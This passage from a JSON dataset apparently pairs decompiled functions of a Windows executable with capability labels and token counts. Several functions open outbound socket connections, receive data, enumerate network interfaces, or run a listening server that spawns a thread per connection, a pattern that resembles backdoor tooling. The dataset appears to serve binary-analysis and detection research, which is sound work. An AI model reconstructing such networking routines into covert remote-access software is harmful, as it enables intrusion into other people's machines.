        "decompiled_code": "\nvoid __fastcall fcn.0045e7d4(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    \n    cVar1 = fcn.004047cc();\n    if (cVar1 == '\\0') {\n        fcn.0045f39c();\n    }\n    if (param_2 == in_EAX[0xc]) {\n        fcn.0045e884();\n    }\n    else {\n        fcn.004602a4();\n    }\n    if ((param_2 == 0) || (param_2 == -1)) {\n        (**(*in_EAX + 0x6c))();\n    }\n    return;\n}\n",
        "token_count": 157
    },
    "0046d13c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046d13c(int32_t param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uchar *puStack92;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_28h;\n    uint var_18h;\n    uint var_14h;\n    int32_t *var_10h;\n    int32_t *var_ch;\n    uint himl;\n    uint var_4h;\n    \n    puStack68 = 0x46d167;\n    himl = param_2;\n    fcn.004181c0(&fcn.0046d13c::var_28h, *(in_EAX + 0x30));\n    puStack68 = 0x46d16f;\n    fcn.0046ddd8();\n    uStack72 = 0x46d2d5;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    puStack80 = 0x46d189;\n    puStack68 = &stack0xfffffffc;\n    var_ch = fcn.0042cbe0();\n    uStack84 = 0x46d2b8;\n    uStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    puStack92 = 0x46d1a8;\n    puStack80 = &stack0xfffffffc;\n    (**(*var_ch + 0x34))();\n    puStack92 = 0x46d1b6;\n    (**(*var_ch + 0x40))();\n    puStack92 = 0x46d1c2;\n    var_10h = fcn.0042cbe0();\n    uStack96 = 0x46d29b;\n    uStack100 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff9c;\n    puStack92 = &stack0xfffffffc;\n    fcn.0042dfe4();\n    (**(*var_10h + 0x34))();\n    (**(*var_10h + 0x40))();\n    uStack104 = himl;\n    iVar1 = sub.comctl32.dll_ImageList_GetImageCount();\n    if (-1 < iVar1 + -1) {\n        iVar3 = 0;\n        do {\n            if ((param_1 == -1) || (iVar3 == param_1)) {\n                var_14h = fcn.0042d1b4();\n                fcn.004287a8();\n                uVar2 = fcn.00428b60(0, 0, 0);\n                sub.comctl32.dll_ImageList_Draw(himl, iVar3, uVar2);\n                var_18h = fcn.0042d1b4();\n                fcn.004287a8();\n                fcn.00428b60(0, 0, 0x10);\n                uStack104 = himl;\n                sub.comctl32.dll_ImageList_Draw();\n                fcn.0046cd0c();\n            }\n            iVar3 = iVar3 + 1;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = uStack104;\n    uStack96 = 0x46d2a2;\n    uStack100 = 0x46d29a;\n    fcn.00404640();\n    return;\n}\n",
        "token_count": 822
    },
    "00479aec": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.00479aec(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    \n    uVar1 = sub.user32.dll_LoadCursorA(0, 0x7f00);\n    *(in_EAX + 0x60) = uVar1;\n    iVar2 = -0x16;\n    do {\n        sub.user32.dll_LoadCursorA();\n        fcn.00479ba8();\n        iVar2 = iVar2 + 1;\n    } while (iVar2 != -1);\n    return;\n}\n",
        "token_count": 125
    },
    "00479e58": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00479e58(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint *puVar2;\n    \n    uVar1 = 0;\n    if (param_2 != -1) {\n        for (puVar2 = *(in_EAX + 0x5c); (puVar2 != NULL && (param_2 != puVar2[1])); puVar2 = *puVar2) {\n        }\n        if (puVar2 == NULL) {\n            uVar1 = *(in_EAX + 0x60);\n        }\n        else {\n            uVar1 = puVar2[2];\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 165
    },
    "0047ffe8": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.0047ffe8(void)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_fffff954;\n    int32_t iStack1680;\n    uint uStack1676;\n    uchar *puStack1672;\n    uint uStack1668;\n    uint uStack1664;\n    uint uStack1660;\n    int32_t iStack1656;\n    uint uStack1652;\n    uchar *puStack1648;\n    uint var_65ch;\n    uint var_658h;\n    uint var_654h;\n    uint var_1ch;\n    int32_t in;\n    uint uStack24;\n    uint uStack20;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t s;\n    \n    puStack1648 = &stack0xfffffffc;\n    uStack1652 = 0x480119;\n    iStack1656 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffff988;\n    uStack1660 = 0x480015;\n    fcn.0040546c();\n    uStack1660 = 0;\n    uStack1664 = 1;\n    uStack1668 = 2;\n    puStack1672 = 0x480020;\n    iVar1 = sub.wsock32.dll_socket();\n    s = iVar1;\n    if (iVar1 != -1) {\n        uStack1676 = 0x4800eb;\n        iStack1680 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xfffff970;\n        puStack1672 = &stack0xfffffffc;\n        iVar2 = sub.WS2_32.DLL_WSAIoctl\n                          (iVar1, 0x4004747f, 0, 0, &fcn.0047ffe8::var_658h, 0x400, &fcn.0047ffe8::var_8h, 0, 0);\n        if ((iVar2 != -1) && (-1 < var_8h / 0x4c + -1)) {\n            var_ch = var_8h / 0x4c;\n            puVar3 = &fcn.0047ffe8::var_654h;\n            do {\n                var_1ch = *puVar3;\n                in = puVar3[1];\n                uStack24 = puVar3[2];\n                uStack20 = puVar3[3];\n                sub.wsock32.dll_inet_ntoa(puVar3[1]);\n                fcn.00405664();\n                fcn.00405738();\n                var_1ch = puVar3[0xc];\n                in = puVar3[0xd];\n                uStack24 = puVar3[0xe];\n                uStack20 = puVar3[0xf];\n                var_1ch = puVar3[6];\n                iVar1 = puVar3[7];\n                in = iVar1;\n                uStack24 = puVar3[8];\n                uStack20 = puVar3[9];\n                sub.wsock32.dll_inet_ntoa(in_EAX);\n                fcn.00405738();\n                puVar3 = puVar3 + 0x13;\n                var_ch = var_ch + -1;\n            } while (var_ch != 0);\n        }\n        *in_FS_OFFSET = iVar1;\n        in_stack_fffff954 = s;\n        sub.wsock32.dll_closesocket();\n    }\n    *in_FS_OFFSET = in_stack_fffff954;\n    fcn.0040546c(0x480120);\n    return;\n}\n",
        "token_count": 810
    },
    "0048316c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_3ch\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_44h\n// WARNING: Variable defined which should be unmapped: var_40h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid fcn.0048316c(void)\n\n{\n    uint in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint unaff_EBX;\n    int32_t unaff_ESI;\n    int32_t *in_FS_OFFSET;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    int32_t var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    int32_t var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    int32_t var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t *var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h = &stack0xfffffffc;\n    iVar2 = 0x16;\n    do {\n        var_4h = 0;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    var_1ch = 0x483747;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0048316c::var_20h;\n    var_14h = in_EAX;\n    var_10h = unaff_ESI;\n    var_ch = unaff_EBX;\n    fcn.00420b38();\n    var_18h = fcn.00404610();\n    piVar1 = fcn.00404610();\n    fcn.00420c14();\n    fcn.00420d58();\n    fcn.00421314();\n    iVar2 = (**(*var_18h + 0x14))();\n    if (-1 < iVar2 + -1) {\n        var_1ch = 0;\n        do {\n            iVar2 = var_38h;\n            (**(*var_18h + 0xc))(var_4h);\n            (**(*var_18h + 0xc))(0x483798, var_34h);\n            fcn.004214dc();\n            fcn.0040a588();\n            var_34h = 0x483798;\n            var_38h = 0x48324f;\n            (**(*var_18h + 0xc))();\n            var_8h = 0x48325c;\n            fcn.004214dc();\n            var_8h = var_44h;\n            var_ch = 0x483798;\n            var_10h = 0x4837a4;\n            var_14h = 0x483760;\n            var_18h = 0x483798;\n            var_1ch = 0x4837b4;\n            var_20h = 0x4837c0;\n            fcn.00405800();\n            var_1ch = var_1ch + 1;\n        } while (iVar2 != 1);\n    }\n    fcn.00420be4();\n    (**(*var_18h + 0x44))();\n    fcn.00420c14();\n    fcn.00420d58();\n    fcn.00421314();\n    iVar2 = (**(*var_18h + 0x14))();\n    if (-1 < iVar2 + -1) {\n        var_1ch = 0;\n        do {\n            (**(*var_18h + 0xc))(var_8h);\n            (**(*var_18h + 0xc))(0x483798, var_4ch);\n            fcn.004214dc();\n            fcn.0040a588();\n            (**(*var_18h + 0xc))(0x483798);\n            var_8h = 0x483347;\n            fcn.004214dc();\n            var_8h = var_5ch;\n            var_ch = 0x483798;\n            var_10h = 0x4837cc;\n            var_14h = 0x483760;\n            var_18h = 0x483798;\n            var_1ch = 0x4837b4;\n            var_20h = 0x4837c0;\n            fcn.00405800();\n            var_1ch = var_1ch + 1;\n        } while (var_50h != 1);\n    }\n    fcn.00420be4();\n    (**(*var_18h + 0x44))();\n    fcn.00420c14();\n    fcn.00420d58();\n    fcn.0042124c();\n    var_30h = (**(*var_18h + 0x14))();\n    if (-1 < var_30h + -1) {\n        var_1ch = 0;\n        do {\n            fcn.00420be4();\n            (**(*var_18h + 0xc))();\n            fcn.00405784();\n            fcn.00420d58();\n            fcn.00421314();\n            var_20h = (**(*piVar1 + 0x54))();\n            (**(*piVar1 + 0x54))();\n            iVar2 = (**(*piVar1 + 0x54))();\n            (**(*piVar1 + 0x54))();\n            if ((var_20h != -1) && (iVar2 != -1)) {\n                (**(*var_18h + 0xc))(var_ch);\n                (**(*piVar1 + 0xc))(0x483798, var_6ch);\n                fcn.004214dc();\n                var_30h = var_70h;\n                (**(*piVar1 + 0xc))(0x483798);\n                fcn.004214dc();\n                (**(*piVar1 + 0xc))(0x483798, var_78h);\n                fcn.004214dc();\n                (**(*piVar1 + 0xc))(0x483894, var_80h);\n                var_14h = 0x48350c;\n                fcn.004214dc();\n                var_14h = var_88h;\n                var_18h = 0x483798;\n                var_1ch = 0x4838a0;\n                var_20h = 0x4837c0;\n                fcn.00405800();\n            }\n            var_1ch = var_1ch + 1;\n            var_30h = var_30h + -1;\n        } while (var_30h != 0);\n    }\n    fcn.00420be4();\n    (**(*var_18h + 0x44))();\n    (**(*piVar1 + 0x44))();\n    fcn.00420c14();\n    fcn.00420d58();\n    fcn.0042124c();\n    var_30h = (**(*var_18h + 0x14))();\n    if (-1 < var_30h + -1) {\n        var_1ch = 0;\n        do {\n            fcn.00420be4();\n            (**(*var_18h + 0xc))();\n            fcn.00405784();\n            fcn.00420d58();\n            fcn.00421314();\n            var_20h = (**(*piVar1 + 0x54))();\n            (**(*piVar1 + 0x54))();\n            iVar2 = (**(*piVar1 + 0x54))();\n            if ((var_20h != -1) && (iVar2 != -1)) {\n                (**(*var_18h + 0xc))(var_10h);\n                (**(*piVar1 + 0xc))(0x483798, var_98h);\n                fcn.004214dc();\n                var_30h = var_9ch;\n                (**(*piVar1 + 0xc))(0x483798);\n                fcn.004214dc();\n                (**(*piVar1 + 0xc))(0x483798, var_a4h);\n                var_14h = 0x4836bf;\n                fcn.004214dc();\n                var_14h = var_ach;\n                var_18h = 0x483798;\n                var_1ch = 0x4838a0;\n                var_20h = 0x4837c0;\n                fcn.00405800();\n            }\n            var_1ch = var_1ch + 1;\n            var_30h = var_30h + -1;\n        } while (var_30h != 0);\n    }\n    iVar2 = var_10h;\n    fcn.00405800(var_10h, var_ch, var_8h, var_4h);\n    fcn.00404640();\n    fcn.00404640();\n    fcn.00404640();\n    *in_FS_OFFSET = iVar2;\n    fcn.00405490(0x48374e);\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 2365
    },
    "00485848": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00485848 noreturn (uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack1076;\n    uint uStack1072;\n    uchar *puStack1068;\n    uint var_418h;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack1068 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack1072 = 0x485957;\n    uStack1076 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack1076;\n    fcn.00405504();\n    iVar1 = sub.wsock32.dll_socket(2, 1, 6);\n    if (iVar1 < 0) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread(0);\n    }\n    fcn.00403ae4();\n    var_18h._0_2_ = 2;\n    var_14h = sub.wsock32.dll_inet_addr(arg_8h);\n    var_18h._2_2_ = sub.wsock32.dll_htons(0x50);\n    if (var_14h == -1) {\n        iVar2 = sub.wsock32.dll_gethostbyname(arg_8h);\n        if (iVar2 == 0) {\n    // WARNING: Subroutine does not return\n            sub.kernel32.dll_ExitThread(0);\n        }\n        var_14h = ***(iVar2 + 0xc);\n    }\n    iVar2 = sub.wsock32.dll_connect(iVar1, &var_18h, 0x10);\n    if (iVar2 < 0) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread(0);\n    }\n    fcn.0049393c();\n    sub.wsock32.dll_recv(iVar1, &var_418h, 0x400, 0);\n    fcn.00405664();\n    sub.kernel32.dll_Sleep_1(1000);\n    sub.wsock32.dll_closesocket(iVar1);\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread(0);\n}\n",
        "token_count": 529
    },
    "00486c68": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00486c68(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack72;\n    int32_t iStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_18h;\n    uint var_14h;\n    uint name;\n    int32_t var_ch;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x486daa;\n    iStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack48;\n    *0x4ad278 = sub.wsock32.dll_socket(2, 1, 0);\n    if (*0x4ad278 == -1) {\n        **0x4a4de0 = 0;\n    }\n    else {\n        name._0_2_ = 2;\n        name._2_2_ = sub.wsock32.dll_htons(**0x4a4dbc);\n        var_ch = sub.wsock32.dll_inet_addr(**0x4a4f7c);\n        if (var_ch == -1) {\n            iStack72 = **0x4a4f7c;\n            iVar1 = sub.wsock32.dll_gethostbyname();\n            if (iVar1 == 0) {\n                **0x4a4de0 = 0;\n                goto code_r0x00486d8f;\n            }\n            var_ch = ***(iVar1 + 0xc);\n        }\n        sub.wsock32.dll_connect(*0x4ad278, &name, 0x10);\n        sub.wsock32.dll_recv(*0x4ad278, 0x4ab278, 0x1fff, 0);\n        fcn.00403ae4();\n        fcn.00409c6c(0x486dc0);\n        fcn.00405800(0x486ddc, 0x486dd0, 0);\n        fcn.0049393c();\n        iStack72 = *0x4ad278;\n        sub.wsock32.dll_recv();\n        fcn.00403ae4();\n    }\ncode_r0x00486d8f:\n    *in_FS_OFFSET = iStack72;\n    fcn.00405490(0x486db1);\n    return;\n}\n",
        "token_count": 516
    },
    "00487174": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00487174 noreturn (int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack68 = &stack0xfffffffc;\n    var_4h = 0;\n    puStack56 = 0x487199;\n    fcn.00405f08();\n    uStack60 = 0x4872f0;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    uStack72 = 0x4872a9;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    puStack56 = &stack0xfffffffc;\n    fcn.00408460();\n    fcn.00405504();\n    uVar2 = *(arg_8h + 4);\n    fcn.00403ae4();\n    iVar1 = sub.wsock32.dll_socket(2, 1, 0);\n    if (iVar1 == -1) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread(0);\n    }\n    var_1ch._0_2_ = 2;\n    var_1ch._2_2_ = sub.wsock32.dll_htons(uVar2);\n    uVar2 = fcn.004058fc();\n    var_18h = sub.wsock32.dll_inet_addr(uVar2);\n    if (var_18h == -1) {\n        uVar2 = fcn.004058fc();\n        iVar3 = sub.wsock32.dll_gethostbyname(uVar2);\n        if (iVar3 == 0) {\n    // WARNING: Subroutine does not return\n            sub.kernel32.dll_ExitThread(0);\n        }\n        var_18h = ***(iVar3 + 0xc);\n    }\n    iVar3 = sub.wsock32.dll_connect(iVar1, &fcn.00487174::var_1ch, 0x10);\n    if (iVar3 == 0) {\n        fcn.00409c6c(0x48731c, var_4h, 0x487308);\n        fcn.00405800(0);\n        fcn.004938a4();\n        sub.wsock32.dll_closesocket(iVar1);\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread(0);\n    }\n    sub.wsock32.dll_closesocket(iVar1);\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread(0);\n}\n",
        "token_count": 669
    },
    "0048762c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0048762c noreturn (uint arg_8h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack1084;\n    uint uStack1080;\n    uchar *puStack1076;\n    uint var_420h;\n    uint var_41ch;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack1076 = &stack0xfffffffc;\n    var_420h = 0;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    uStack1080 = 0x4877a4;\n    uStack1084 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack1084;\n    fcn.00405664();\n    fcn.00405a48(&var_420h);\n    fcn.00405964();\n    uVar1 = fcn.004058fc();\n    fcn.00405a48();\n    fcn.004059a4();\n    uVar2 = fcn.00409dd8();\n    fcn.00487550();\n    iVar3 = sub.wsock32.dll_socket(2, 1, 6);\n    if (iVar3 < 0) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread(0);\n    }\n    fcn.00403ae4();\n    var_1ch._0_2_ = 2;\n    var_18h = sub.wsock32.dll_inet_addr(uVar1);\n    var_1ch._2_2_ = sub.wsock32.dll_htons(uVar2);\n    if (var_18h == -1) {\n        iVar4 = sub.wsock32.dll_gethostbyname(uVar1);\n        if (iVar4 == 0) {\n    // WARNING: Subroutine does not return\n            sub.kernel32.dll_ExitThread(0);\n        }\n        var_18h = ***(iVar4 + 0xc);\n    }\n    iVar4 = sub.wsock32.dll_connect(iVar3, &var_1ch, 0x10);\n    if (iVar4 < 0) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread(0);\n    }\n    fcn.004874ac();\n    sub.wsock32.dll_recv(iVar3, &var_41ch, 0x400, 0);\n    fcn.00405664();\n    sub.kernel32.dll_Sleep_1(1000);\n    sub.wsock32.dll_closesocket(iVar3);\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread(0);\n}\n",
        "token_count": 641
    },
    "00488054": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.00488054(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uchar auStack372 [8];\n    uint uStack364;\n    uint uStack360;\n    uint *puStack356;\n    uint uStack352;\n    uint uStack348;\n    uchar *puStack344;\n    uint var_150h;\n    uint var_134h;\n    uint var_130h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack344 = 0x488068;\n    fcn.004058ec();\n    uStack348 = 0x488106;\n    uStack352 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffea0;\n    puStack356 = &fcn.00488054::var_150h;\n    uStack360 = 0x488085;\n    puStack344 = &stack0xfffffffc;\n    uStack360 = fcn.004058fc();\n    uStack364 = 0x48808b;\n    iVar2 = sub.kernel32.dll_FindFirstFileA_1();\n    if (iVar2 == -1) {\n        var_10h = 0;\n        var_ch = 0;\n        *in_FS_OFFSET = uStack360;\n        uStack352 = 0x48810d;\n        puStack356 = 0x488105;\n        fcn.0040546c();\n        return;\n    }\n    uVar1 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe8c;\n    *in_FS_OFFSET = uVar1;\n    return;\n}\n",
        "token_count": 360
    },
    "00489684": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00489684 noreturn (uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t *unaff_EBX;\n    uint *in_FS_OFFSET;\n    uint32_t uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uStack132;\n    uint uStack128;\n    uchar *puStack124;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_20h;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    puStack124 = 0x4896bb;\n    fcn.00405f08();\n    uStack128 = 0x48989e;\n    uStack132 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff7c;\n    puStack124 = &stack0xfffffffc;\n    fcn.00408460();\n    uVar1 = sub.wsock32.dll_socket(2, 1, 6);\n    fcn.00403ae4();\n    var_30h._0_2_ = 2;\n    var_30h._2_2_ = sub.wsock32.dll_htons(var_10h & 0xffff);\n    var_2ch = 0;\n    iVar2 = sub.wsock32.dll_bind(uVar1, &fcn.00489684::var_30h, 0x10);\n    if (iVar2 == 0) {\n        iVar2 = sub.wsock32.dll_listen(uVar1, 5);\n        if (iVar2 == 0) {\n            uVar5 = 0;\n            uVar3 = var_10h;\n            fcn.00409d58(var_10h);\n            fcn.00405784(uVar3, uVar5);\n            fcn.0048a288();\n            fcn.00409c6c();\n            uVar4 = 0;\n            uVar5 = 0;\n            fcn.00409d58(var_10h);\n            fcn.0048992c(uVar5, uVar4);\n            while( true ) {\n                var_20h = 0x10;\n                var_18h = sub.wsock32.dll_accept(uVar1, &fcn.00489684::var_40h, &fcn.00489684::var_20h);\n                if (var_18h == 0xffffffff) break;\n                unaff_EBX = sub.kernel32.dll_LocalAlloc_1(0x40, 0x10);\n                *unaff_EBX = var_10h;\n                fcn.004054c0();\n                fcn.004054c0();\n                unaff_EBX[3] = var_18h;\n                uVar5 = sub.kernel32.dll_CreateThread(0, 0, fcn.00489170, unaff_EBX, 0, &fcn.00489684::var_1ch);\n                sub.kernel32.dll_CloseHandle_1(uVar5);\n                sub.kernel32.dll_Sleep_1();\n            }\n            uVar3 = *unaff_EBX;\n            uVar1 = 0;\n            fcn.00409d58(uVar3);\n            fcn.00405784(uVar3, uVar1);\n            fcn.0048a288();\n            uVar3 = *unaff_EBX;\n            uVar1 = 0;\n            fcn.00409d58(uVar3);\n            fcn.00489ce0(uVar3, uVar1);\n            goto code_r0x0048986e;\n        }\n    }\n    uVar3 = *unaff_EBX;\n    uVar1 = 0;\n    fcn.00409d58(uVar3);\n    fcn.00405784(uVar3, uVar1);\n    fcn.0048a288();\n    uVar3 = *unaff_EBX;\n    uVar1 = 0;\n    fcn.00409d58(uVar3);\n    fcn.00489ce0(uVar3, uVar1);\ncode_r0x0048986e:\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread(0);\n}\n",
        "token_count": 1026
    },
    "0048fd2c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0048fd2c(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint lpLastWriteTime;\n    uint lpLastAccessTime;\n    uint lpCreationTime;\n    int32_t hObject;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    uStack52 = 0;\n    uStack56 = 0;\n    uStack60 = 3;\n    uStack64 = 0;\n    uStack68 = 1;\n    uStack72 = 0x80000000;\n    uStack76 = 0x48fd55;\n    uStack76 = fcn.004058fc();\n    puStack80 = 0x48fd5b;\n    iVar2 = sub.kernel32.dll_CreateFileA_1();\n    if (iVar2 == -1) {\n        return var_1h;\n    }\n    uStack84 = 0x48fdd6;\n    iStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    puStack80 = &fcn.0048fd2c::var_1h + 1;\n    hObject = iVar2;\n    iVar3 = sub.kernel32.dll_GetFileTime\n                      (iVar2, &fcn.0048fd2c::lpCreationTime, &fcn.0048fd2c::lpLastAccessTime, \n                       &fcn.0048fd2c::lpLastWriteTime);\n    if (iVar3 != 0) {\n        cVar1 = fcn.0048fcec();\n        if (cVar1 != '\\0') {\n            cVar1 = fcn.0048fcec();\n            if (cVar1 != '\\0') {\n                cVar1 = fcn.0048fcec();\n                if (cVar1 != '\\0') {\n                    var_1h._0_1_ = 1;\n                    goto code_r0x0048fdbc;\n                }\n            }\n        }\n    }\n    var_1h._0_1_ = 0;\ncode_r0x0048fdbc:\n    *in_FS_OFFSET = iVar2;\n    uVar4 = sub.kernel32.dll_CloseHandle_1(hObject, 0x48fddd);\n    return uVar4;\n}\n",
        "token_count": 617
    },
    "00490f58": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
